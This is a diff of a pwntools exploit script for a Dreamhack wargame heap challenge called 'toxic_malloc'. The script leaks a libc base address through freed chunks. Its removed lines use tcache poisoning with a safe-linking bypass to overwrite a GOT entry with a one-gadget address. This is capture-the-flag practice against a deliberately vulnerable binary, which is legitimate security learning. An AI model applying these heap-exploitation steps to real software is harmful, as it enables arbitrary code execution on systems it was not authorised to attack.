@@ -1,10 +1,10 @@
 from pwn import *
 
-context.log_level = 'debug'
+# context.log_level = 'debug'
 # context.terminal = ['tmux', 'new-window']
 
 env = {"LD_PRELOAD": "/home/hibrian827/Wargame/Dreamhack/Pwnable/toxic_malloc/problem/deploy/libc.so.6"}
-rem = process("./Pwnable/toxic_malloc/problem/deploy/chall", env=env)
+rem = process("./Pwnable/toxic_malloc/problem/deploy/chall")
 # port = 18595
 # rem = remote("host3.dreamhack.games", port)
 
@@ -50,6 +50,9 @@ def delete(idx):
   rem.sendlineafter(b'choice:', b"4")
   rem.sendlineafter(b": ", str(idx).encode())
 
+def exit():
+  rem.sendlineafter(b'choice:', b"5")
+
 create(0, b'A' * 8)
 create(1, b'A' * 8)
 
@@ -64,17 +67,8 @@ for i in range(1, 7):
   delete(0)
 
 lib_base = u64(read(0).rstrip().ljust(8, b'\x00')) - 0x21ace0
-stdout_got = lib_base + lib.got['realloc']
-if stdout_got % 0x10 != 0:
-  stdout_got -= 8
-gadget_addr = lib_base + 0xebd43
-print(hex(stdout_got))
-
-update(0, p64(safe_link(heap_base+0x2a0, heap_base+0x2a0)))
-create(2, p64(safe_link(heap_base+0x2a0, stdout_got)))
-create(3, b"A" * 16)
-create(4, p64(gadget_addr) * 2)
+print(hex(lib_base))
 gdb.attach(rem)
-read(3)
+exit()
 
 rem.interactive()
